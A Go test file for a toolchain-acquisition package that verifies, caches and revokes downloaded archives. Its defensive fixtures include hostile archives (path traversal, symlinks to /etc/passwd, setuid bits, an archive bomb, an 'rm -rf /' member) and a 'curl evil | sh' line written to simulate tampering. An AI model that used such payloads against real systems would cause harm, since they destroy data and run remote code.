package acquire

import (
	"archive/tar"
	"context"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/andrea-dintino/auto-pigeon-companion/internal/binding"
	"github.com/andrea-dintino/auto-pigeon-companion/internal/catalog"
	"github.com/andrea-dintino/auto-pigeon-companion/internal/job"
	"github.com/andrea-dintino/auto-pigeon-companion/internal/profile"
)

func TestAValidInstallVerifiesBeforeItExtracts(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	acquirer := f.acquirer()
	install, err := acquirer.Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("a valid install failed: %v", err)
	}
	if install.Digest != f.digestOf("fixture.tool") {
		t.Errorf("the install records %s, the catalogue says %s", install.Digest, f.digestOf("fixture.tool"))
	}
	if install.CatalogSerial != 1 || install.Signer != f.catalogKeyID {
		t.Errorf("the install does not record who vouched for it: %+v", install)
	}
	if install.Aggregation != catalog.Aggregation {
		t.Error("the install record must carry the separate-work statement")
	}

	_, root, err := acquirer.Use(install.Digest)
	if err != nil {
		t.Fatalf("using what was just installed failed: %v", err)
	}
	tool := filepath.Join(root, "bin", "fixture")
	info, err := os.Stat(tool)
	if err != nil {
		t.Fatalf("the executable is not where the record says: %v", err)
	}
	if info.Mode().Perm()&0o100 == 0 {
		t.Error("the extracted executable is not executable")
	}
	content, err := os.ReadFile(tool)
	if err != nil || string(content) != toolScript {
		t.Errorf("the extracted file is not what the archive contained: %v", err)
	}
	// The install record must not carry the query string of a download URL.
	if strings.Contains(install.SourceURL, "?") {
		t.Errorf("the install record kept a query string: %q", install.SourceURL)
	}
}

func TestASecondInstallIsACacheHitAndFetchesNothing(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	acquirer := f.acquirer()
	if _, err := acquirer.Install(context.Background(), "fixture.tool", ""); err != nil {
		t.Fatalf("%v", err)
	}
	if got := f.requests.Load(); got != 1 {
		t.Fatalf("the first install made %d artifact requests, want 1", got)
	}
	// A fresh acquirer, so nothing is memoised in process.
	if _, err := f.acquirer().Install(context.Background(), "fixture.tool", ""); err != nil {
		t.Fatalf("%v", err)
	}
	if got := f.requests.Load(); got != 1 {
		t.Errorf("the second install fetched the artifact again: %d requests", got)
	}
}

func TestConcurrentInstallsOfTheSameArtifactProduceOneEntry(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	const installers = 6
	var wait sync.WaitGroup
	errs := make([]error, installers)
	for i := 0; i < installers; i++ {
		wait.Add(1)
		go func(i int) {
			defer wait.Done()
			_, errs[i] = f.acquirer().Install(context.Background(), "fixture.tool", "")
		}(i)
	}
	wait.Wait()
	for i, err := range errs {
		if err != nil {
			t.Errorf("installer %d failed: %v", i, err)
		}
	}
	entries, err := f.acquirer().Cache().List()
	if err != nil {
		t.Fatalf("%v", err)
	}
	if len(entries) != 1 {
		t.Fatalf("%d cache entries after concurrent installs, want 1", len(entries))
	}
	// And the one that is there is usable, not a half-written directory.
	if _, _, err := f.acquirer().Use(entries[0].Digest); err != nil {
		t.Errorf("the entry left by concurrent installs is not usable: %v", err)
	}
}

func TestAnInterruptedDownloadLeavesNothingAndTheRetrySucceeds(t *testing.T) {
	f := newFixture(t)
	body := goodArchive(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", body,
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	// The first attempt gets half the archive and a closed connection.
	var interrupted bool
	f.fail = func(w http.ResponseWriter, r *http.Request) bool {
		if interrupted {
			return false
		}
		interrupted = true
		w.Header().Set("Content-Length", "999999")
		w.Write(body[:len(body)/2])
		return true
	}

	acquirer := f.acquirer()
	if _, err := acquirer.Install(context.Background(), "fixture.tool", ""); err == nil {
		t.Fatal("an interrupted download was installed")
	}
	entries, err := acquirer.Cache().List()
	if err != nil {
		t.Fatalf("%v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("an interrupted download left %d cache entries", len(entries))
	}

	// The retry is a fresh download into a fresh staging directory, not a
	// resume into bytes whose provenance is now two transfers.
	install, err := f.acquirer().Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("the retry after an interrupted download failed: %v", err)
	}
	if _, _, err := f.acquirer().Use(install.Digest); err != nil {
		t.Errorf("the retried install is not usable: %v", err)
	}
}

func TestAWrongDigestIsRefusedAndNothingIsInstalled(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	// The catalogue is signed over a digest, and the server serves other bytes.
	f.document.Packages[0].Artifacts[0].SHA256 = "sha256:" + strings.Repeat("00", 32)
	f.publish()

	acquirer := f.acquirer()
	_, err := acquirer.Install(context.Background(), "fixture.tool", "")
	if !errors.Is(err, ErrDigestMismatch) {
		t.Fatalf("a download that did not match its digest was accepted: %v", err)
	}
	entries, _ := acquirer.Cache().List()
	if len(entries) != 0 {
		t.Errorf("a digest mismatch left %d cache entries", len(entries))
	}
}

func TestAWrongSizeIsRefusedBeforeTheDigestIsEvenComputed(t *testing.T) {
	f := newFixture(t)
	body := goodArchive(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", body,
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.document.Packages[0].Artifacts[0].Size = int64(len(body)) + 100
	f.publish()

	if _, err := f.acquirer().Install(context.Background(), "fixture.tool", ""); !errors.Is(err, ErrSizeMismatch) {
		t.Fatalf("a download of the wrong length was accepted: %v", err)
	}
}

func TestAServerThatSendsMoreThanItPromisedIsRefused(t *testing.T) {
	f := newFixture(t)
	body := goodArchive(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", body,
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()
	f.fail = func(w http.ResponseWriter, r *http.Request) bool {
		// No Content-Length, so the length check cannot fire early: the read
		// itself has to be the thing that is bounded.
		w.Write(body)
		w.Write([]byte("and then some more"))
		return true
	}
	if _, err := f.acquirer().Install(context.Background(), "fixture.tool", ""); !errors.Is(err, ErrSizeMismatch) {
		t.Fatalf("an over-long download was accepted: %v", err)
	}
}

func TestAPlatformWithNoBuildIsRefusedWithTheOnesThereAre(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.document.Packages[0].Artifacts[0].Platform = profile.Platform{OS: "plan9", Arch: "amd64"}
	f.publish()

	_, err := f.acquirer().Install(context.Background(), "fixture.tool", "")
	if err == nil {
		t.Fatal("a package with no build for this machine was installed")
	}
	if !strings.Contains(err.Error(), "plan9/amd64") {
		t.Errorf("the error should say which platforms there are: %v", err)
	}
}

func TestAnExpiredCatalogueRefusesToInstallAnything(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.document.IssuedAt = testNow.Add(-48 * time.Hour)
	f.document.ExpiresAt = testNow.Add(-time.Hour)
	f.publish()

	_, err := f.acquirer().Install(context.Background(), "fixture.tool", "")
	var expired *catalog.ExpiredError
	if !errors.As(err, &expired) {
		t.Fatalf("an expired catalogue installed something: %v", err)
	}
}

func TestADowngradedCatalogueIsRefused(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "2.0.0", "fixture-2.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.document.Serial = 5
	f.publish()
	if _, err := f.acquirer().Install(context.Background(), "fixture.tool", ""); err != nil {
		t.Fatalf("%v", err)
	}

	// Somebody serves the previous catalogue: correctly signed, and the wrong
	// answer. It named a build that has since been withdrawn.
	f.document.Serial = 4
	f.publish()
	if _, err := f.acquirer().Install(context.Background(), "fixture.tool", ""); !errors.Is(err, catalog.ErrRollback) {
		t.Fatalf("a replayed older catalogue was accepted: %v", err)
	}
}

func TestARevokedArtifactIsRefusedOnInstallAndOnUse(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	install, err := f.acquirer().Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	// It is on disk and it works. Then it is withdrawn.
	if _, _, err := f.acquirer().Use(install.Digest); err != nil {
		t.Fatalf("%v", err)
	}
	f.document.Serial = 2
	f.document.Revocations = []catalog.Revocation{{
		Digest: install.Digest, Reason: "the published build was not the one that was built", At: testNow,
	}}
	f.publish()

	acquirer := f.acquirer()
	if _, err := acquirer.Install(context.Background(), "fixture.tool", ""); !errors.Is(err, catalog.ErrRevoked) {
		t.Fatalf("a revoked artifact was installed: %v", err)
	}
	// And now the revocation is this machine's, so the copy already on disk is
	// refused too — with no catalogue in the picture at all.
	offline := f.acquirer(func(o *Options) { o.Offline = true })
	if _, _, err := offline.Use(install.Digest); !errors.Is(err, catalog.ErrRevoked) {
		t.Fatalf("an already-installed revoked artifact was still usable: %v", err)
	}
}

func TestMaliciousArchivesAreRefusedBeforeAnythingIsPublished(t *testing.T) {
	cases := []struct {
		name    string
		archive func(t *testing.T) []byte
	}{
		{"path traversal", func(t *testing.T) []byte {
			return tarGz(t, tarEntry{Name: "../../../tmp/owned", Mode: 0o755, Content: "x"})
		}},
		{"absolute path", func(t *testing.T) []byte {
			return tarGz(t, tarEntry{Name: "/etc/cron.d/owned", Mode: 0o644, Content: "x"})
		}},
		{"symbolic link", func(t *testing.T) []byte {
			return tarGz(t,
				tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript},
				tarEntry{Name: "bin/escape", Typeflag: tar.TypeSymlink, Linkname: "/etc/passwd"})
		}},
		{"hard link", func(t *testing.T) []byte {
			return tarGz(t,
				tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript},
				tarEntry{Name: "bin/alias", Typeflag: tar.TypeLink, Linkname: "bin/fixture"})
		}},
		{"device node", func(t *testing.T) []byte {
			return tarGz(t, tarEntry{Name: "dev/sda", Typeflag: tar.TypeBlock})
		}},
		{"fifo", func(t *testing.T) []byte {
			return tarGz(t, tarEntry{Name: "pipe", Typeflag: tar.TypeFifo})
		}},
		{"setuid bit", func(t *testing.T) []byte {
			return tarGz(t, tarEntry{Name: "bin/fixture", Mode: 0o4755, Content: toolScript})
		}},
		{"duplicate member", func(t *testing.T) []byte {
			return tarGz(t,
				tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript},
				tarEntry{Name: "bin/fixture", Mode: 0o755, Content: "#!/bin/sh\nrm -rf /\n"})
		}},
		{"archive bomb", func(t *testing.T) []byte {
			// Ten megabytes of one repeated byte, which gzip flattens to
			// almost nothing. The declared unpacked size is a megabyte.
			return tarGz(t, tarEntry{Name: "bin/fixture", Mode: 0o755, Size: 10 << 20})
		}},
		{"zip symlink", func(t *testing.T) []byte {
			return zipArchive(t,
				tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript},
				tarEntry{Name: "bin/escape", Typeflag: tar.TypeSymlink, Linkname: "/etc/passwd"})
		}},
		{"zip traversal", func(t *testing.T) []byte {
			return zipArchive(t, tarEntry{Name: "../../owned", Mode: 0o644, Content: "x"})
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := newFixture(t)
			body := c.archive(t)
			kind := catalog.KindTarGz
			if strings.HasPrefix(c.name, "zip") {
				kind = catalog.KindZip
			}
			f.addPackage("example.hostile", "1.0.0", "hostile.tar.gz", body, kind, []string{"bin/fixture"}, "")
			f.publish()

			acquirer := f.acquirer()
			_, err := acquirer.Install(context.Background(), "example.hostile", "")
			if err == nil {
				t.Fatal("a hostile archive was installed")
			}
			entries, _ := acquirer.Cache().List()
			if len(entries) != 0 {
				t.Errorf("a refused archive left %d cache entries", len(entries))
			}
			// Nothing escaped the staging directory either.
			if _, err := os.Stat(filepath.Join(f.dir, "owned")); err == nil {
				t.Error("the archive wrote outside its extraction directory")
			}
		})
	}
}

func TestOfflineUsesOnlyAlreadyVerifiedPinnedContent(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	install, err := f.acquirer().Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("%v", err)
	}

	offline := f.acquirer(func(o *Options) {
		o.Offline = true
		// No transport at all: a request would fail rather than quietly work.
		o.HTTP = &http.Client{Transport: refusingTransport{}}
	})
	found, err := offline.FindInstalled("fixture.tool", "")
	if err != nil {
		t.Fatalf("an installed package was not usable offline: %v", err)
	}
	if found.Digest != install.Digest {
		t.Errorf("offline resolved %s, want %s", found.Digest, install.Digest)
	}
	if _, _, err := offline.Use(found.Digest); err != nil {
		t.Errorf("using an installed package offline failed: %v", err)
	}
	// But something that is not already there cannot be obtained.
	if _, err := offline.Install(context.Background(), "example.not-installed", ""); !errors.Is(err, catalog.ErrOffline) {
		t.Errorf("offline install of an absent package did not say it was offline: %v", err)
	}
	if _, err := offline.Plan(context.Background(), "fixture.tool", ""); !errors.Is(err, catalog.ErrOffline) {
		t.Errorf("offline planning reached for the catalogue: %v", err)
	}
}

// refusingTransport fails every request, so a test that claims to be offline is
// held to it.
type refusingTransport struct{}

func (refusingTransport) RoundTrip(*http.Request) (*http.Response, error) {
	return nil, errors.New("the test is offline and something tried to use the network")
}

func TestTamperingIsDetectedOnUseAndNotOnlyOnInstall(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	acquirer := f.acquirer()
	install, err := acquirer.Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	entry, err := acquirer.Cache().EntryPath(install.Digest)
	if err != nil {
		t.Fatalf("%v", err)
	}
	tool := filepath.Join(install.ToolRoot(entry), "bin", "fixture")
	if err := os.Chmod(tool, 0o700); err != nil {
		t.Fatalf("%v", err)
	}
	if err := os.WriteFile(tool, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o700); err != nil {
		t.Fatalf("%v", err)
	}

	if _, _, err := f.acquirer().Use(install.Digest); !errors.Is(err, ErrTampered) {
		t.Fatalf("an edited executable was handed out for execution: %v", err)
	}
	if _, err := f.acquirer().Cache().VerifyEntry(install.Digest); !errors.Is(err, ErrTampered) {
		t.Errorf("a full verification missed an edited file: %v", err)
	}
}

func TestAFileAddedToACacheEntryIsDetected(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	acquirer := f.acquirer()
	install, err := acquirer.Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	entry, _ := acquirer.Cache().EntryPath(install.Digest)
	added := filepath.Join(install.ToolRoot(entry), "bin", "extra")
	if err := os.WriteFile(added, []byte("#!/bin/sh\n"), 0o700); err != nil {
		t.Fatalf("%v", err)
	}
	if _, err := acquirer.Cache().VerifyEntry(install.Digest); !errors.Is(err, ErrTampered) {
		t.Fatalf("a file added to a toolchain directory was not noticed: %v", err)
	}
}

func TestALicenceNoticeMustBeAcknowledgedBeforeTheFirstDownload(t *testing.T) {
	f := newFixture(t)
	f.addPackage("example.noticed", "1.0.0", "noticed.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.document.Packages[0].RequiresAcceptance = true
	f.document.Packages[0].License.Notice = "This program is distributed in the hope that it will be useful."
	f.publish()

	acquirer := f.acquirer()
	plan, err := acquirer.Plan(context.Background(), "example.noticed", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	if !plan.NeedsAcceptance {
		t.Fatal("a licence that requires notice was not flagged")
	}
	text := plan.Text()
	for _, want := range []string{"GPL-2.0-or-later", "example.invalid/example.noticed/source", "1.0.0", "hope that it will be useful",
		catalog.Aggregation, "does not change what the licence requires"} {
		if !strings.Contains(text, want) {
			t.Errorf("the plan does not mention %q:\n%s", want, text)
		}
	}
	if f.requests.Load() != 0 {
		t.Error("planning downloaded the artifact")
	}

	if _, err := acquirer.Install(context.Background(), "example.noticed", ""); !errors.Is(err, ErrLicenseNotAccepted) {
		t.Fatalf("a package needing acknowledgement was installed anyway: %v", err)
	}
	if _, err := acquirer.Accept(context.Background(), "example.noticed", ""); err != nil {
		t.Fatalf("%v", err)
	}
	if _, err := f.acquirer().Install(context.Background(), "example.noticed", ""); err != nil {
		t.Fatalf("the install after acknowledgement failed: %v", err)
	}

	// A changed notice is a notice nobody has read.
	f.document.Serial = 2
	f.document.Packages[0].License.Notice = "The licence text changed, and this is different text."
	f.publish()
	plan, err = f.acquirer().Plan(context.Background(), "example.noticed", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	if !plan.NeedsAcceptance {
		t.Error("an acknowledgement carried forward across a changed notice")
	}
}

func TestNothingFallsBackToAnUnverifiedInstall(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()

	for _, c := range []struct {
		name    string
		options func(*Options)
	}{
		{"no trust anchor", func(o *Options) { o.AnchorsPath = "" }},
		{"no catalogue address", func(o *Options) { o.CatalogURL = "" }},
		{"an unreachable catalogue", func(o *Options) {
			o.HTTP = &http.Client{Transport: refusingTransport{}}
		}},
		{"an anchor file that is not there", func(o *Options) {
			o.AnchorsPath = filepath.Join(f.dir, "absent-anchors.json")
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			acquirer := f.acquirer(c.options)
			if _, err := acquirer.Install(context.Background(), "fixture.tool", ""); err == nil {
				t.Fatal("a download happened with no way to verify it")
			}
			entries, _ := acquirer.Cache().List()
			if len(entries) != 0 {
				t.Errorf("%d cache entries exist after a refused install", len(entries))
			}
		})
	}
}

func TestAKeyRevokedInTheKeyringInvalidatesTheCatalogueItSigned(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", goodArchive(t),
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	f.publish()
	if _, err := f.acquirer().Install(context.Background(), "fixture.tool", ""); err != nil {
		t.Fatalf("%v", err)
	}

	// The signing key is compromised. A new keyring says so; there is no
	// replacement key, which is the emergency case rather than the tidy one.
	revoked := testNow
	f.keyring.Serial = 2
	f.keyring.Keys[0].Status = catalog.StatusRevoked
	f.keyring.Keys[0].RevokedAt = &revoked
	f.keyring.Keys[0].Reason = "the signing machine was compromised"
	f.publish()

	_, err := f.acquirer().Install(context.Background(), "fixture.tool2", "")
	if err == nil {
		t.Fatal("a catalogue signed by a revoked key was accepted")
	}
	if !strings.Contains(err.Error(), "revoked") {
		t.Errorf("the error does not say the key was revoked: %v", err)
	}
}

func TestGarbageCollectionKeepsEveryPinnedAndEveryRecordedVersion(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz",
		tarGz(t, tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript + "1\n"}),
		catalog.KindTarGz, []string{"bin/fixture"}, "")
	f.addPackage("fixture.tool", "2.0.0", "fixture-2.0.tar.gz",
		tarGz(t, tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript + "2\n"}),
		catalog.KindTarGz, []string{"bin/fixture"}, "")
	f.addPackage("example.orphan", "1.0.0", "orphan.tar.gz",
		tarGz(t, tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript + "3\n"}),
		catalog.KindTarGz, []string{"bin/fixture"}, "")
	f.publish()

	acquirer := f.acquirer()
	one, err := acquirer.Install(context.Background(), "fixture.tool", "1.0.0")
	if err != nil {
		t.Fatalf("%v", err)
	}
	two, err := acquirer.Install(context.Background(), "fixture.tool", "2.0.0")
	if err != nil {
		t.Fatalf("%v", err)
	}
	orphan, err := acquirer.Install(context.Background(), "example.orphan", "")
	if err != nil {
		t.Fatalf("%v", err)
	}

	// One version is what the binding is bound to; the other is a version the
	// user pinned. Both are references, which is what "preserve multiple
	// pinned versions" means.
	bindings := binding.NewSet()
	if err := bindings.Put(binding.LocalBinding{
		ProfileID:     "example.tool",
		ProfileDigest: "sha256:" + strings.Repeat("ab", 32),
		Installs: []binding.PinnedInstall{
			{PackageID: "fixture.tool", Version: "2.0.0", Digest: two.Digest, PinnedAt: testNow},
			{PackageID: "fixture.tool", Version: "1.0.0", Digest: one.Digest, PinnedAt: testNow},
		},
	}); err != nil {
		t.Fatalf("%v", err)
	}
	jobs := []*job.Job{{ID: "20260601T120000Z-0123456789ab", Installs: []string{orphan.Digest}}}

	references := ReferencesFrom(bindings, jobs)
	collected, err := acquirer.Collect(references, true)
	if err != nil {
		t.Fatalf("%v", err)
	}
	if len(collected.Removed) != 0 {
		t.Errorf("a dry run would remove %d referenced entries", len(collected.Removed))
	}
	if len(collected.Kept) != 3 {
		t.Errorf("kept %d entries, want 3", len(collected.Kept))
	}

	// Drop the job's evidence, and only then is its toolchain collectable.
	collected, err = acquirer.Collect(ReferencesFrom(bindings, nil), false)
	if err != nil {
		t.Fatalf("%v", err)
	}
	if len(collected.Removed) != 1 || collected.Removed[0].Digest != orphan.Digest {
		t.Fatalf("collection removed %v, want just the unreferenced entry", collected.Removed)
	}
	for _, digest := range []string{one.Digest, two.Digest} {
		if _, _, err := f.acquirer().Use(digest); err != nil {
			t.Errorf("a pinned version was damaged by collection: %v", err)
		}
	}
	if f.acquirer().Cache().Has(orphan.Digest) {
		t.Error("the unreferenced entry is still there")
	}
}

func TestTheNewestVersionIsChosenWhenNoneIsPinned(t *testing.T) {
	f := newFixture(t)
	f.addPackage("fixture.tool", "1.9.0", "fixture-1.9.tar.gz",
		tarGz(t, tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript + "9\n"}),
		catalog.KindTarGz, []string{"bin/fixture"}, "")
	f.addPackage("fixture.tool", "1.10.0", "fixture-1.10.tar.gz",
		tarGz(t, tarEntry{Name: "bin/fixture", Mode: 0o755, Content: toolScript + "10\n"}),
		catalog.KindTarGz, []string{"bin/fixture"}, "")
	f.publish()

	install, err := f.acquirer().Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	if install.Version != "1.10.0" {
		t.Errorf("installed %s; 1.10.0 is newer than 1.9.0", install.Version)
	}
}

func TestASingleFileArtifactBecomesAnExecutable(t *testing.T) {
	f := newFixture(t)
	f.addPackage("example.bare", "1.0.0", "bare-binary", []byte(toolScript),
		catalog.KindFile, []string{"fixture"}, "")
	f.publish()

	install, err := f.acquirer().Install(context.Background(), "example.bare", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	_, root, err := f.acquirer().Use(install.Digest)
	if err != nil {
		t.Fatalf("%v", err)
	}
	info, err := os.Stat(filepath.Join(root, "fixture"))
	if err != nil {
		t.Fatalf("%v", err)
	}
	if info.Mode().Perm()&0o100 == 0 {
		t.Error("a single-file artifact was not made executable")
	}
}

func TestAnErrorNeverCarriesADownloadQueryString(t *testing.T) {
	f := newFixture(t)
	body := goodArchive(t)
	f.addPackage("fixture.tool", "1.0.0", "fixture-1.0.tar.gz", body,
		catalog.KindTarGz, []string{"bin/fixture"}, "tool-1.0")
	// A pre-signed URL, of the shape a CDN hands out. The query string is the
	// credential, and it must not reach a log, an error or a stored record.
	f.artifacts["/fixture-1.0.tar.gz"] = body
	f.document.Packages[0].Artifacts[0].URL = f.server.URL + "/fixture-1.0.tar.gz?X-Amz-Signature=deadbeefcafe&Expires=99"
	f.document.Packages[0].Artifacts[0].SHA256 = "sha256:" + strings.Repeat("00", 32)
	f.publish()

	acquirer := f.acquirer()
	_, err := acquirer.Install(context.Background(), "fixture.tool", "")
	if err == nil {
		t.Fatal("the digest mismatch was not caught")
	}
	if strings.Contains(err.Error(), "deadbeefcafe") || strings.Contains(err.Error(), "X-Amz-Signature") {
		t.Errorf("the error leaked the signed query string: %v", err)
	}

	// And the plan a user is shown does not carry it either.
	f.document.Packages[0].Artifacts[0].SHA256 = f.digestOfBytes(body)
	f.document.Serial = 2
	f.publish()
	plan, err := f.acquirer().Plan(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	if strings.Contains(plan.Text(), "deadbeefcafe") {
		t.Errorf("the plan leaked the signed query string:\n%s", plan.Text())
	}
	install, err := f.acquirer().Install(context.Background(), "fixture.tool", "")
	if err != nil {
		t.Fatalf("%v", err)
	}
	if strings.Contains(install.SourceURL, "deadbeefcafe") {
		t.Errorf("the install record kept the signed query string: %q", install.SourceURL)
	}
}
